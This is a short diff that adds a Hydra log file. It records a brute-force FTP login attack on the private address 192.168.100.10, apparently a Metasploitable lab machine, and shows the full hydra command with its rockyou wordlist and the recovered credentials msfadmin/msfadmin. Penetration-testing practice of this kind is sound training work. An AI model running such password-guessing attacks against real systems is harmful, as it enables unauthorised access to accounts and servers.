@@ -1,0 +1,2 @@
+# Hydra v9.6 run at 2025-10-04 01:06:31 on 192.168.100.10 ftp (hydra -l msfadmin -p /usr/share/wordlists/rockyou.txt -e sr -o Desktop/hydra_ftp_log.txt -I ftp://192.168.100.10)
+[21][ftp] host: 192.168.100.10   login: msfadmin   password: msfadmin
